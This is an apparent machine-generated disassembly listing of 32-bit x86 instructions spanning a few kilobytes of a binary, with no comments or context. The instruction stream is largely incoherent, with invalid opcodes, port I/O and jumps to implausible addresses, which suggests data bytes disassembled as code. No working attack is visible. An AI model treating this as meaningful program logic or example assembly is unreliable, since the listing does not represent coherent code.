  41fb6e:	mov    ds,WORD PTR [ecx+ebx*1+0x7]
  41fb72:	mul    BYTE PTR [ebx+0x9]
  41fb75:	jb     0x41fb77
	...
  41fb93:	add    BYTE PTR [ebx+0xd138c96],bl
  41fb99:	sub    al,BYTE PTR [ebp-0x19ff5dd7]
  41fb9f:	adc    BYTE PTR [eax-0x1ef0d6b],bl
  41fba5:	idiv   ecx
  41fba7:	ret    
  41fba8:	mov    bl,BYTE PTR [eax]
  41fbaa:	in     al,dx
  41fbab:	adc    BYTE PTR [eax+0x128e720b],al
  41fbb1:	cwde   
  41fbb2:	es cdq 
  41fbb4:	adc    eax,0x96034100
  41fbb9:	lds    ebp,FWORD PTR [ebp+0x77226ab3]
  41fbbf:	adc    BYTE PTR [eax-0x7c],bl
  41fbc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbc3:	add    BYTE PTR [ecx+0xd03eb41],cl
  41fbc9:	sti    
  41fbca:	push   esp
  41fbcb:	mov    BYTE PTR [ecx+0x7f],0x8f
  41fbcf:	add    ecx,DWORD PTR [eax]
  41fbd1:	test   bl,bl
  41fbd3:	pop    es
  41fbd4:	or     eax,0x19bc1f00
  41fbd9:	test   BYTE PTR [ebp+eax*1+0xaf000d],ah
  41fbe0:	xchg   ecx,eax
  41fbe1:	fucomp st(0)
  41fbe3:	add    ecx,DWORD PTR ds:0xd687e5b8
  41fbe9:	add    bh,ah
  41fbeb:	add    edx,DWORD PTR [ebp-0x5]
  41fbee:	push   0x64
  41fbf0:	or     eax,0x1bbe700
  41fbf5:	test   DWORD PTR [edi+0x7],edx
	...
  41fc14:	add    BYTE PTR [eax],al
  41fc16:	or     eax,0x59c3bf00
  41fc1b:	out    0xe6,eax
  41fc1d:	popf   
  41fc1e:	or     eax,0x3d73a47d
  41fc23:	sbb    BYTE PTR [ebx+esi*2-0x38],dh
  41fc27:	or     ah,BYTE PTR [ebx+0x43]
  41fc2a:	adc    BYTE PTR [edi+edi*2-0x70fff2f9],al
  41fc31:	ret    
  41fc32:	cmp    edi,esp
  41fc34:	(bad)  
  41fc35:	call   0xa4ccfac2
  41fc3a:	dec    edx
  41fc3b:	mov    al,0xe7
  41fc3d:	ins    BYTE PTR es:[edi],dx
  41fc3e:	and    DWORD PTR ds:0xfd4965fd,ecx
  41fc44:	or     DWORD PTR [ecx+0x15],0x0
  41fc48:	add    BYTE PTR [edx+0x4c],ah
  41fc4b:	mov    DWORD PTR ds:[eax-0x4102f59c],ebp
  41fc52:	or     DWORD PTR [ecx-0x31],edi
  41fc55:	test   al,0x7
  41fc57:	lock or BYTE PTR [ebx-0x7440c51a],ch
  41fc5e:	popa   
  41fc5f:	mov    esi,ebx
  41fc61:	jmp    0xe241fc69
  41fc66:	add    DWORD PTR [ebx-0x18],ecx
  41fc69:	loope  0x41fc34
  41fc6b:	sbb    eax,0x82ccf208
  41fc70:	inc    ebx
  41fc71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc72:	dec    ecx
  41fc73:	sti    
  41fc74:	add    eax,0x12
  41fc77:	add    BYTE PTR [eax],al
  41fc79:	add    DWORD PTR [eax],0x0
	...
  41fc97:	add    BYTE PTR [esi-0x6816fff4],al
  41fc9d:	jae    0x1ac00efa
  41fca3:	in     eax,dx
  41fca4:	push   cs
  41fca5:	add    BYTE PTR [eax-0x57],ch
  41fca8:	fwait
  41fca9:	call   0x3dd642ad
  41fcae:	push   esi
  41fcaf:	push   ecx
  41fcb0:	fnstcw WORD PTR [ecx-0x3]
  41fcb3:	ss xchg ebp,eax
  41fcb5:	inc    eax
  41fcb6:	or     eax,0xfffde665
  41fcbb:	call   0x724dba17
  41fcc0:	xchg   esp,eax
  41fcc1:	cmp    eax,0xc80e189
  41fcc6:	push   eax
  41fcc7:	in     eax,dx
  41fcc8:	js     0x41fceb
  41fcca:	ins    BYTE PTR es:[edi],dx
  41fccb:	add    BYTE PTR [edx],dl
  41fccd:	add    al,0x0
  41fccf:	jmp    0x3cf84d
  41fcd4:	das    
  41fcd5:	outs   dx,DWORD PTR ds:[esi]
  41fcd6:	add    eax,0x18727468
  41fcdb:	add    BYTE PTR [esi],bh
  41fcdd:	test   DWORD PTR [eax-0x1ab24bbb],0xfaf9f3fe
  41fce7:	test   BYTE PTR [edx+ecx*1-0x298267f],dh
  41fcee:	jmp    DWORD PTR [ebp-0x5b]
  41fcf1:	cmp    dh,ch
  41fcf3:	or     dl,bl
  41fcf5:	ret    0xf340
  41fcf8:	ins    BYTE PTR es:[edi],dx
  41fcf9:	addr16 adc al,0x33
	...
  41fd18:	add    BYTE PTR [eax],al
  41fd1a:	mov    bl,0xbb
  41fd1c:	(bad)  
  41fd1d:	jg     0x41fd83
  41fd1f:	std    
  41fd20:	cli    
  41fd21:	adc    eax,0x3d10dc
  41fd26:	test   eax,0xe98b65bc
  41fd2b:	fimul  DWORD PTR [edx]
  41fd2d:	xchg   ebp,eax
  41fd2e:	jmp    0xf97b603f
  41fd33:	bnd jo 0x41fd40
  41fd36:	or     al,BYTE PTR [ebp+0x3c4adb40]
  41fd3c:	inc    edx
  41fd3d:	repz cmp al,bh
  41fd40:	mov    ebp,0xfffd7401
  41fd45:	mov    DWORD PTR [ecx+0x344d89d4],ebp
  41fd4b:	xchg   edi,ecx
  41fd4d:	add    BYTE PTR [ebp+0x4],0x80
  41fd51:	loop   0x41fd48
  41fd53:	ss (bad) 
  41fd55:	je     0x41fd61
  41fd57:	js     0x41fd1e
  41fd59:	je     0x41fd30
  41fd5b:	sub    eax,0xda138c6
  41fd60:	or     al,0x94
  41fd62:	or     eax,0xac80bbd8
  41fd67:	and    BYTE PTR [edx-0x211f041],al
  41fd6d:	xor    ah,al
  41fd6f:	rcl    BYTE PTR ds:[eax],0x1a
  41fd73:	stos   DWORD PTR es:[edi],eax
  41fd74:	inc    ebx
  41fd75:	inc    edi
  41fd76:	mov    ?,edi
  41fd78:	cld    
  41fd79:	or     ah,0x1a
  41fd7c:	clc    
  41fd7d:	out    dx,al
	...
  41fd9a:	add    BYTE PTR [eax],al
  41fd9c:	xchg   ebx,ebx
  41fd9e:	adc    ecx,DWORD PTR [edx+0x420965d]
  41fda4:	lea    esi,[eax+ecx*1]
  41fda7:	cmp    al,BYTE PTR [edi-0x36]
  41fdaa:	in     eax,0x83
  41fdac:	inc    esp
  41fdad:	shl    al,cl
  41fdaf:	xor    BYTE PTR [esi+ecx*1-0x42],dl
  41fdb3:	adc    BYTE PTR [edx],dl
  41fdb5:	mov    bl,0x40
  41fdb7:	inc    edi
  41fdb8:	mov    ?,WORD PTR [edi+0xa]
  41fdbb:	or     DWORD PTR [esi+ecx*1+0x18],0xcc5ffe0d
  41fdc3:	dec    edx
  41fdc4:	push   ds
  41fdc5:	sub    dh,BYTE PTR [ebp-0x41]
  41fdc8:	les    edx,FWORD PTR [ebp+0x578ef420]
  41fdce:	hlt    
  41fdcf:	or     BYTE PTR [esp+ebx*4],bl
  41fdd2:	mov    esp,0x2778def
  41fdd7:	and    al,0xf
  41fdd9:	fnstsw WORD PTR [ebx]
  41fddb:	je     0x41fdda
  41fddd:	in     eax,0x43
  41fddf:	test   ah,dl
  41fde1:	push   ds
  41fde2:	jne    0x41fda4
  41fde4:	push   ebp
  41fde5:	call   0x8c3:0xd98ee023
  41fdec:	std    
  41fded:	iret   
  41fdee:	(bad)  
  41fdef:	out    dx,eax
  41fdf0:	adc    eax,0x6569fa45
  41fdf5:	cwde   
  41fdf6:	cmp    eax,0xe7000500
  41fdfb:	add    esi,DWORD PTR [eax]
  41fdfd:	push   cs
  41fdfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdff:	adc    eax,DWORD PTR [eax]
	...
  41fe1d:	add    BYTE PTR ds:0x8a99df8c,bl
  41fe23:	sbb    DWORD PTR ds:0xe7000504,0x6bfd24ac
  41fe2d:	(bad)  
  41fe2e:	mov    edx,0xbac763b0
  41fe33:	mov    al,0xfe
  41fe35:	imul   edx,DWORD PTR [esi+0x59fce700],0xdab4d9bd
  41fe3f:	neg    BYTE PTR [ebp+0x61b073c6]
  41fe45:	mov    BYTE PTR [esi],0x7b
  41fe48:	out    dx,eax
  41fe49:	js     0x41fea6
  41fe4b:	pop    es
  41fe4c:	pop    ss
  41fe4d:	in     al,dx
  41fe4e:	jae    0x41fe42
  41fe50:	mov    bl,0xc
  41fe52:	pusha  
  41fe53:	jnp    0x41fe81
  41fe55:	cld    
  41fe56:	repnz mov edi,0x9952e91d
  41fe5c:	in     eax,0x7e
  41fe5e:	into   
  41fe5f:	imul   esi,DWORD PTR [edi],0x1c
  41fe62:	fs jbe 0x41fdf3
  41fe65:	or     al,0x91
  41fe67:	inc    eax
  41fe68:	test   BYTE PTR [edi+0x3e7027b],0x8d
  41fe6f:	test   DWORD PTR [edx+0x3],ebx
  41fe72:	adc    BYTE PTR [ebp-0x59],ch
  41fe75:	cld    
  41fe76:	pusha  
  41fe77:	inc    eax
  41fe78:	mov    bh,0x78
  41fe7a:	into   
  41fe7b:	outs   dx,BYTE PTR ds:[esi]
  41fe7c:	jb     0x41feb1
  41fe7e:	xchg   esp,eax
  41fe7f:	aaa    
  41fe80:	sub    BYTE PTR [edx],bl
	...
  41fe9e:	add    BYTE PTR [eax],al
  41fea0:	sbb    eax,0xd034981
  41fea5:	pop    es
  41fea6:	out    0xf8,eax
  41fea8:	ret    
  41fea9:	jp     0x41feda
  41feab:	inc    edx
  41feac:	retf   0xffef
  41feaf:	or     ecx,DWORD PTR [ecx]
  41feb1:	add    eax,0x3ed5e900
  41feb6:	mov    DWORD PTR [edx+edx*8+0x4ff1df45],ebp
  41febd:	sbb    cl,BYTE PTR [eax]
  41febf:	loop   0x41fec0
  41fec1:	js     0x41fecb
  41fec3:	push   cs
  41fec4:	jle    0x41feb8
  41fec6:	out    0x40,al
  41fec8:	add    al,BYTE PTR ds:0xfe9b72fd
  41fece:	addr16 test eax,0x82ffe779
  41fed4:	xchg   edi,eax
  41fed5:	jns    0x41ff1a
  41fed7:	mov    ch,0x59
  41fed9:	push   ds
  41feda:	sub    BYTE PTR [edi+0x16],0x5
  41fede:	test   BYTE PTR [ecx-0x14a47d7a],ch
  41fee4:	push   cs
  41fee5:	add    BYTE PTR [esi-0x58],ah
  41fee8:	dec    esp
  41fee9:	cmp    DWORD PTR [eax],ecx
  41feeb:	inc    edi
  41feec:	rol    dl,1
  41feee:	int3   
  41feef:	loope  0x41fe9d
  41fef1:	inc    ebp
  41fef2:	inc    ebx
  41fef3:	cwde   
  41fef4:	pop    ecx
  41fef5:	pushf  
  41fef6:	mov    esi,0x7ff81a2c
  41fefb:	sbb    al,0x5
  41fefd:	add    BYTE PTR ds:0xc6d0c97c,cl
  41ff03:	fiadd  DWORD PTR [eax]
	...
  41ff21:	add    BYTE PTR [edi],al
  41ff23:	js     0x41ff68
  41ff25:	mov    ch,0x40
  41ff27:	mov    ecx,0x7738f7f7
  41ff2c:	inc    ebx
  41ff2d:	test   DWORD PTR [edx+0x4807053f],ecx
  41ff33:	mov    esi,0x9e0ddcfd
  41ff38:	ss icebp 
  41ff3a:	call   0x38fd:0x496a44fe
  41ff41:	int3   
  41ff42:	push   es
  41ff43:	xchg   edx,eax
  41ff44:	jmp    0x41ff46
  41ff46:	emms   
  41ff48:	cmc    
  41ff49:	jne    0x41ff38
  41ff4b:	cli    
  41ff4c:	inc    eax
  41ff4d:	clc    
  41ff4e:	outs   dx,DWORD PTR ds:[esi]
  41ff4f:	inc    edi
  41ff50:	cmc    
  41ff51:	imul   ebp,DWORD PTR ds:0xf8758a03,0xffffffe3
  41ff58:	mov    dl,0xfb
  41ff5a:	mov    ah,0x1
  41ff5c:	test   al,al
  41ff5e:	stos   DWORD PTR es:[edi],eax
  41ff5f:	test   ebp,edi
  41ff61:	add    DWORD PTR [ecx+eax*1-0x1420099],esp
  41ff68:	js     0x41ff56
  41ff6a:	jle    0x41ff70
  41ff6c:	mov    al,BYTE PTR [ebp-0x18]
  41ff6f:	dec    ebx
  41ff70:	push   esp
  41ff71:	call   0x41f7b5
  41ff76:	mov    ebp,0x6bfff929
  41ff7b:	imul   edi,DWORD PTR ds:0x6a017f77,0x5704b01
  41ff85:	call   0x41ff8a
	...
  41ffa2:	add    BYTE PTR [eax],al
  41ffa4:	out    0x86,eax
  41ffa6:	cli    
  41ffa7:	push   eax
  41ffa9:	ror    BYTE PTR [edx],0x84
  41ffac:	test   ah,bh
  41ffae:	(bad)  
  41ffaf:	(bad)  
  41ffb0:	out    dx,eax
  41ffb1:	ja     0x41ffb8
  41ffb3:	push   0x187124
  41ffb8:	push   ds
  41ffb9:	dec    BYTE PTR [eax-0x1aae6fbb]
  41ffbf:	fcmovu st,st(1)
  41ffc1:	stc    
  41ffc2:	cli    
  41ffc3:	test   BYTE PTR [edx+ecx*1-0x7f],ah
  41ffc7:	mov    ch,0x35
  41ffc9:	add    DWORD PTR [eax],eax
  41ffcb:	pavgw  mm0,QWORD PTR [edi-0x1f]
  41ffcf:	add    DWORD PTR [edi],0x48
  41ffd2:	std    
  41ffd3:	mov    ah,ch
  41ffd5:	pop    ds
  41ffd6:	cld    
  41ffd7:	add    ah,dh
  41ffd9:	add    BYTE PTR [ebp+0x441f0de0],bh
  41ffdf:	out    0x5,eax
  41ffe1:	and    al,BYTE PTR [esi+eiz*2-0x7c]
  41ffe5:	pop    ecx
  41ffe6:	mov    ecx,0xf9d69065
  41ffeb:	adc    DWORD PTR [ebx+0xa000116],0xffffff8e
  41fff2:	or     BYTE PTR [edi+0x717818ea],bh
  41fff8:	push   ecx
  41fff9:	xchg   edx,eax
  41fffa:	cmp    eax,ebp
  41fffc:	push   ecx
  41fffe:	add    BYTE PTR [eax],al
  420000:	xchg   ecx,eax
  420001:	(bad)  
  420002:	stc    
  420003:	xor    DWORD PTR [eax+ebx*1],0x1
	...
  420023:	add    BYTE PTR [eax],al
  420025:	add    BYTE PTR ds:0xd189257,dh
  42002b:	data16 or dh,BYTE PTR [esi]
  42002e:	xchg   BYTE PTR [ebx-0x74741808],dl
  420034:	push   es
  420035:	std    
  420036:	xchg   ecx,eax
  420037:	push   esi
  420038:	test   DWORD PTR [ebx+0x117ec],0xfff3bb8e
  420042:	aas    
  420043:	push   edi
  420044:	dec    esi
  420045:	add    BYTE PTR [edx+0x16],ch
  420048:	add    DWORD PTR [esi+0x26],esp
  42004b:	fidivr DWORD PTR [ebx+0x1a1bf70]
  420051:	or     eax,0xbef3cb9a
  420056:	sub    al,0x18
  420058:	jp     0x4200a5
  42005a:	xor    eax,0xc893919
  42005f:	mov    ds:0x262bbf13,al
  420064:	jl     0x42005e
  420066:	out    dx,al
  420067:	cmp    bl,0xf4
  42006a:	adc    al,ch
  42006c:	mov    BYTE PTR [eax],al
  42006e:	dec    esp
  42006f:	jl     0x42006d
  420071:	mov    esi,0xfceeff25
  420076:	add    eax,esp
  420078:	sub    ch,bh
  42007a:	bnd jns 0x420095
  42007d:	jge    0x4200cb
  42007f:	mov    esp,0x96ea8f61
  420084:	jmp    0x420030
  420086:	and    esi,esp
  420088:	in     al,0x8e
	...
  4200a6:	add    BYTE PTR [eax],al
  4200a8:	or     eax,0xd9b7a279
  4200ad:	mov    ebp,0xb585a1d6
  4200b2:	mul    BYTE PTR [ecx-0x6a5148fb]
  4200b8:	jns    0x4200d1
  4200ba:	in     al,dx
  4200bb:	dec    ebp
  4200bc:	or     eax,0x8403e703
  4200c1:	mov    edi,0x41d57cb2
  4200c6:	or     ah,dh
  4200c8:	xchg   ebp,eax
  4200c9:	adc    dl,cl
  4200cb:	adc    eax,0x14623204
  4200d0:	push   edx
  4200d1:	adc    ch,bh
  4200d3:	in     al,0x7c
  4200d5:	repz xchg esp,eax
  4200d7:	mov    ah,0xd1
  4200d9:	inc    eax
  4200da:	enter  0x5fb,0x32
  4200de:	loop   0x42011d
  4200e0:	mov    dh,BYTE PTR [edi-0x29a7aea]
  4200e6:	xor    edx,edi
  4200e8:	lea    eax,[edi+0x7d0803d2]
  4200ee:	fmul   QWORD PTR [eax+edx*2]
  4200f1:	add    ecx,DWORD PTR [edi]
  4200f3:	add    BYTE PTR [ecx],dl
  4200f5:	add    bh,ah
  4200f7:	popf   
  4200f8:	or     al,BYTE PTR [ebx]
  4200fa:	fsubr  QWORD PTR [ebx]
  4200fc:	arpl   WORD PTR [edi-0x23e1f71a],di
  420102:	xlat   BYTE PTR ds:[ebx]
  420103:	ret    
  420104:	sub    bh,BYTE PTR [eax+0x2a]
  420107:	call   0xe642419b
	...
  420128:	add    BYTE PTR [eax],al
  42012a:	fwait
  42012b:	adc    al,0xfa
  42012d:	outs   dx,BYTE PTR ds:[esi]
  42012e:	add    eax,0xee9a71b
  420133:	add    ch,bh
  420135:	(bad)  
  420137:	sbb    dl,BYTE PTR [edx+edx*2]
  42013a:	push   cs
  42013b:	add    BYTE PTR [ecx-0x17fd1536],al
  420141:	and    BYTE PTR [eax],bl
  420143:	add    eax,0x8bced1fd
  420148:	sbb    cl,ch
  42014a:	js     0x42014b
  42014c:	cld    
  42014d:	mov    ah,0xd6
  42014f:	sbb    dh,BYTE PTR [esp+esi*2]
  420152:	adc    eax,0xc5298405
  420157:	jle    0x4201d8
  420159:	jmp    0x8ccb016c
  42015e:	mov    dh,0x9a
  420160:	aas    
  420161:	jle    0x42011c
  420163:	add    ah,BYTE PTR [edi-0x27]
  420166:	sbb    edi,DWORD PTR [edi+0x78f699b3]
  42016c:	mov    esi,gs
  42016e:	or     bh,BYTE PTR [eax+eax*8+0x5d]
  420172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420173:	cmp    BYTE PTR [edx-0x6b],0x69
  420177:	mov    cs,WORD PTR [ebx]
  420179:	imul   eax,DWORD PTR [esi+ecx*2-0x7d8caaf0],0x8d697d7a
  420184:	push   edi
  420185:	imul   edx,DWORD PTR [ebx+ecx*2-0x6360c300],0x24be
	...
  4201ac:	shl    edi,0x65
  4201af:	test   al,0x4c
  4201b1:	dec    eax
  4201b2:	or     BYTE PTR [edi],al
  4201b4:	enter  0xbbbe,0xe1
  4201b8:	mov    es,WORD PTR [esi-0xd6b164b]
  4201be:	or     al,0x0
  4201c0:	leave  
  4201c1:	mov    ebx,0x88da4587
  4201c6:	inc    eax
  4201c7:	mov    ah,0xf4
  4201c9:	mov    BYTE PTR [esi],bh
  4201cb:	xor    esp,esi
  4201cd:	rol    DWORD PTR [eax-0x49],0xf5
  4201d1:	in     eax,0xd0
  4201d3:	cli    
  4201d4:	hlt    
  4201d5:	std    
  4201d6:	mov    DWORD PTR [ebp-0x68],eax
  4201d9:	mov    esp,0x3d6c03e7
  4201de:	ds jmp 0x3cf991
  4201e4:	ja     0x42025d
  4201e6:	adc    DWORD PTR [eax],eax
  4201e8:	cwde   
  4201e9:	paddb  mm6,QWORD PTR [ebp-0x48]
  4201ed:	cli    
  4201ee:	adc    BYTE PTR [eax],cl
  4201f0:	(bad)  
  4201f1:	cmp    eax,0x67abeafd
  4201f6:	std    
  4201f7:	out    0x97,eax
  4201f9:	idiv   edi
  4201fb:	jmp    FWORD PTR [edi]
  4201fd:	in     eax,dx
  4201fe:	out    0x5e,eax
  420200:	stos   DWORD PTR es:[edi],eax
  420201:	cli    
  420202:	cli    
  420203:	call   FWORD PTR [ecx]
  420205:	jmp    0xfde066f1
  42020a:	(bad)  
  42020b:	jmp    0x0:0xe8ee86b8
	...
  42022e:	inc    ecx
  42022f:	icebp  
  420230:	cli    
  420231:	call   FWORD PTR [edi+0x6]
  420234:	cld    
  420235:	jne    0x420283
  420237:	cli    
  420238:	jo     0x420242
  42023a:	dec    esp
  42023b:	outs   dx,BYTE PTR ds:[esi]
  42023c:	hlt    
  42023d:	call   DWORD PTR [ebx+0x5a]
  420240:	pop    ebx
  420241:	pop    ebx
  420242:	popf   
  420243:	mov    edi,0x84fa000f
  420248:	out    dx,eax
  420249:	test   DWORD PTR [edx+0x3a8a4e71],ebx
  42024f:	cmp    DWORD PTR [edi-0x30d3008c],0x903c0d3c
  420259:	add    ah,BYTE PTR [edi+0x11e8a714]
  42025f:	cmp    ebx,edx
  420261:	jb     0x42026f
  420263:	fnstcw WORD PTR [ecx+0xe]
  420266:	fist   WORD PTR [esi-0x7f]
  420269:	neg    ebp
  42026b:	adc    ch,dh
  42026d:	push   eax
  42026e:	lea    ebx,[edi+0x661d7ccb]
  420274:	div    ebp
  420276:	out    0x14,al
  420278:	inc    esp
  420279:	sub    al,0x3d
  42027b:	pop    ecx
  42027c:	ja     0x42028c
  42027e:	lea    edi,[edi+0x5df67ad0]
  420284:	jge    0x42024d
  420286:	popa   
  420287:	push   ss
  420288:	or     dl,0xc
  42028b:	and    cl,BYTE PTR [ebx-0x40]
  42028e:	ret    
  42028f:	aam    0xfe
  420291:	jae    0x420293
	...
  4202af:	add    BYTE PTR [ebx],cl
  4202b1:	jo     0x4202f4
  4202b3:	std    
  4202b4:	or     eax,0xa880117
  4202b9:	sahf   
  4202ba:	ds pop esi
  4202bc:	into   
  4202bd:	ins    BYTE PTR es:[edi],dx
  4202be:	stc    
  4202bf:	push   edi
  4202c0:	retf   
  4202c1:	sbb    DWORD PTR [ecx],eax
  4202c3:	pop    esi
  4202c4:	into   
  4202c5:	arpl   WORD PTR [edx-0x14],di
  4202c8:	mov    es,WORD PTR [edx]
  4202ca:	out    dx,al
  4202cb:	push   eax
  4202cc:	jecxz  0x42028f
  4202ce:	fwait
  4202cf:	call   FWORD PTR [ebx]
  4202d1:	xlat   BYTE PTR ds:[ebx]
  4202d2:	add    ebp,DWORD PTR [eax+0x2d]
  4202d5:	add    al,cl
  4202d7:	jmp    FWORD PTR [edx+0x23]
  4202da:	fdivp  st(6),st
  4202dc:	push   0xffffff8d
  4202de:	sub    esi,DWORD PTR [ecx]
  4202e0:	pop    ebx
  4202e1:	std    
  4202e2:	and    eax,0xfe9dd574
  4202e7:	push   ebp
  4202e8:	mov    esi,0xdfc7451
  4202ed:	add    bh,ah
  4202ef:	add    edx,DWORD PTR [esp+edi*8+0x6f39b134]
  4202f6:	mov    DWORD PTR [edx],0x162000d
  4202fc:	mov    bh,0x0
  4202fe:	sbb    al,BYTE PTR ds:0x3e7e77d
  420304:	or     eax,0xbdadea75
  420309:	add    BYTE PTR [edi-0xc],dl
  42030c:	or     eax,DWORD PTR [eax]
  42030e:	out    0x78,eax
  420310:	or     al,0x8d
  420312:	stos   DWORD PTR es:[edi],eax
  420313:	pop    es
	...
  420330:	add    BYTE PTR [eax],al
  420332:	dec    edx
  420333:	push   0x32ecf7
  420338:	mov    edx,0x2684fd04
  42033d:	(bad)  
  42033e:	daa    
  42033f:	lea    esp,[ebx-0x2400c2e9]
  420345:	ret    
  420346:	std    
  420347:	aas    
  420348:	out    0x99,eax
  42034a:	adc    eax,0x4e7a8d58
  42034f:	in     al,dx
  420350:	imul   ebx,DWORD PTR [eax],0x9e27331d
  420356:	mov    eax,DWORD PTR [ebp+0x13]
  420359:	jns    0x4203a9
  42035b:	cld    
  42035c:	jno    0x42035a
  42035e:	xchg   ebp,eax
  42035f:	cld    
  420360:	imul   ecx,DWORD PTR [edi+0x5f4ba5a6],0x25
  420367:	sbb    al,0x76
  420369:	ret    
  42036a:	mov    cl,BYTE PTR [edi-0x74]
  42036d:	add    al,0x92
  42036f:	inc    eax
  420370:	call   0x2bcd1078
  420375:	or     BYTE PTR [eax+ecx*1+0x7da0537],al
  42037c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42037e:	xchg   ebp,eax
  42037f:	ret    
  420380:	and    DWORD PTR [ebx],edi
  420382:	dec    esp
  420383:	push   ebp
  420384:	add    BYTE PTR [edx-0x6],ah
  420387:	sub    bl,0xd1
  42038a:	jge    0x4203e1
  42038c:	push   ebp
  42038d:	scas   eax,DWORD PTR es:[edi]
  42038e:	cmp    esp,0xffffffff
  420391:	nop
  420392:	cmp    esp,0x96fc
	...
  4203b4:	mov    ch,0xd7
  4203b6:	xor    BYTE PTR [edx+0x2c8b5e9a],0x1
  4203bd:	push   eax
  4203be:	std    
  4203bf:	aam    0x4e
  4203c1:	adc    BYTE PTR [eax-0x17],al
  4203c4:	je     0x4203cd
  4203c6:	pop    eax
  4203c7:	outs   dx,BYTE PTR ds:[esi]
  4203c8:	fwait
  4203c9:	push   es
  4203ca:	data16 jo 0x420390
  4203cd:	out    0xfc,al
  4203cf:	hlt    
  4203d0:	mov    edx,0x77e9400f
  4203d5:	inc    ebx
  4203d6:	lock fs dec esi
  4203d9:	je     0x420413
  4203db:	jb     0x4203ea
  4203dd:	mov    ecx,DWORD PTR [edx+0x41]
  4203e0:	lahf   
  4203e1:	jg     0x4203ce
  4203e3:	fst    DWORD PTR [ebp-0x4]
  4203e6:	mov    dh,BYTE PTR [esi+eiz*1+0x7d4ca2a3]
  4203ed:	mov    eax,ds:0x1679fc
  4203f2:	add    cl,ch
  4203f4:	xor    eax,eax
  4203f6:	jb     0x4203da
  4203f8:	mov    BYTE PTR [edi+0x7a],bh
  4203fb:	add    DWORD PTR [ecx],ecx
  4203fd:	jae    0x420403
  4203ff:	daa    
  420400:	pop    ebx
  420401:	sti    
  420402:	(bad)  
  420403:	arpl   WORD PTR [ebx-0x1a],dx
  420406:	dec    edi
  420407:	out    dx,al
  420408:	js     0x420450
  42040a:	adc    DWORD PTR [ecx],ebp
  42040c:	or     DWORD PTR [eax+0x7311de7a],eax
  420412:	or     BYTE PTR [edx+0xa],ah
  420415:	push   ecx
  420416:	std    
  420417:	cmp    DWORD PTR [eax],eax
	...
  420435:	add    BYTE PTR [ecx],bl
  420437:	xor    ecx,ebx
  420439:	add    BYTE PTR [ebx],ch
  42043b:	bound  eax,QWORD PTR [edi-0x4132d03d]
  420441:	add    al,0x64
  420443:	push   edi
  420444:	xchg   esp,ebp
  420446:	and    eax,0xf98d028f
  42044b:	dec    DWORD PTR [esi+edx*2-0x65]
  42044f:	push   ebx
  420450:	push   0x4776485
  420455:	adc    DWORD PTR [ecx],0x0
  420458:	add    BYTE PTR [ebx+0x50fb5832],cl
  42045e:	sbb    al,0x8d
  420460:	inc    ecx
  420461:	cld    
  420462:	ins    DWORD PTR es:[edi],dx
  420463:	(bad)  
  420464:	data16 sub BYTE PTR [esp+edx*8],cl
  420468:	jno    0x4204ad
  42046a:	hlt    
  42046b:	jmp    0x227f086
  420470:	xchg   DWORD PTR [ebp-0x14],esi
  420473:	xlat   BYTE PTR ss:[ebx]
  420475:	cmp    cl,bh
  420477:	rcr    ecx,0x43
  42047a:	hlt    
  42047b:	js     0x4204aa
  42047d:	mov    edi,0x3fdfdc
  420482:	jae    0x420486
  420484:	adc    DWORD PTR [eax],ebx
  420486:	out    0x41,al
  420488:	add    BYTE PTR [eax],bh
  42048a:	or     esp,eax
  42048c:	fld    DWORD PTR [ebx-0x5c]
  42048f:	js     0x4204a7
  420491:	call   0x4225a4
  420496:	xor    ah,al
  420498:	jo     0x4204a7
	...
  4204b6:	add    BYTE PTR [eax],al
  4204b8:	sbb    eax,0x67ddc41f
  4204bd:	add    esi,eax
  4204bf:	add    eax,0x3fdee4
  4204c4:	jne    0x420520
  4204c6:	sti    
  4204c7:	adc    eax,0x401608
  4204cc:	std    
  4204cd:	pop    edi
  4204ce:	cld    
  4204cf:	lea    ecx,ds:0x754fcc2c
  4204d5:	out    dx,eax
  4204d6:	xchg   ebx,eax
  4204d7:	(bad)  
  4204d8:	bound  esi,QWORD PTR [eax+ecx*2-0x38]
  4204dc:	mov    ebp,0x650c77bd
  4204e1:	ror    DWORD PTR [ebp+0x7604afe],cl
  4204e7:	jmp    0x4002deff
  4204ec:	dec    esi
  4204ed:	jb     0x420557
  4204ef:	call   0x72cfb6f2
  4204f4:	adc    eax,0xd0811f60
  4204f9:	add    BYTE PTR [ecx],0x31
  4204fc:	dec    ebp
  4204fd:	rcr    BYTE PTR [esi],0xd
  420500:	js     0x4204a9
  420502:	call   0x129fbe1
  420507:	ret    0xe715
  42050a:	push   0x8
  42050c:	gs (bad) 
  42050e:	ja     0x420551
  420510:	or     eax,0xce8963f
  420515:	out    0x85,eax
  420517:	(bad)
	...
  420538:	add    BYTE PTR [eax],al
  42053a:	add    eax,0x10e8313e
  42053f:	bound  eax,QWORD PTR [eax+eax*1]
  420542:	mov    dh,0xe5
  420544:	xor    eax,0x8e2a4dc0
  420549:	bound  esp,QWORD PTR [ebp-0x4d03af97]
  42054f:	popa   
  420550:	dec    eax
  420551:	or     BYTE PTR [esi+0x75e800c6],cl
  420557:	adc    DWORD PTR [eax+eax*1],eax
  42055a:	iret   
  42055b:	loop   0x42055d
  42055d:	push   0x1
  42055f:	jg     0x4205b1
  420561:	jae    0x420531
  420563:	out    0xe8,al
  420565:	pop    ebp
  420566:	jbe    0x420567
  420568:	out    0x3,eax
  42056a:	mov    WORD PTR [edx-0x25],fs
  42056d:	add    al,0x84
  42056f:	inc    edx
  420570:	fild   WORD PTR [eax]
  420572:	sbb    eax,0x62819ee8
  420577:	cld    
  420578:	outs   dx,DWORD PTR ds:[esi]
  420579:	inc    edi
  42057a:	jno    0x420564
  42057c:	in     al,dx
  42057d:	xor    al,0x4d
  42057f:	aas    
  420580:	stos   BYTE PTR es:[edi],al
  420581:	lea    ebp,[edi+0x2947a5e7]
  420587:	xchg   edi,eax
  420588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420589:	add    DWORD PTR [eax],edi
  42058b:	sub    BYTE PTR [ebx],0x0
  42058e:	xor    BYTE PTR [eax+0x6b32e82b],cl
  420594:	add    BYTE PTR [ebx],0xd
  420597:	ret    0x3ea
  42059a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42059b:	or     ecx,DWORD PTR [edi]
